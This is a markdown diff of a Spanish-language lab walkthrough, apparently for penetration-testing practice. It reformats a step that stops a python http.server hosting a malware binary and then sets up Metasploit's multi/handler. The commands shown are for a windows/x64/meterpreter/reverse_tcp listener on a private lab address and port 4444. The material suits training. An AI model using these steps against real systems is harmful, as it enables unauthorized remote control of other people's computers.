@@ -80,14 +80,14 @@ python3 -m http.server 80
 ```
 ![malware-agente](descarga-malware-agente.png)
 
-Paso 3.3: Configuración del Escuchador (Multi/Handler) en Metasploit
+### Paso 3.3: Configuración del Escuchador (Multi/Handler) en Metasploit
 Una vez que el archivo ha sido puesto a disposición en la red, regresamos a la terminal de Kali Linux para detener el servidor web temporal (mediante Ctrl + C) e iniciamos el Framework de Metasploit. Configurar el módulo genérico de escucha multi/handler es indispensable para interceptar la conexión de vuelta (Reverse TCP), asegurando que la arquitectura (x64) y los parámetros de red local coincidan plenamente con los del binario compilado.
 
-Bash
+```Bash
 msfconsole
 use multi/handler
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST 10.10.10.5
 set LPORT 4444
 exploit
-
+```
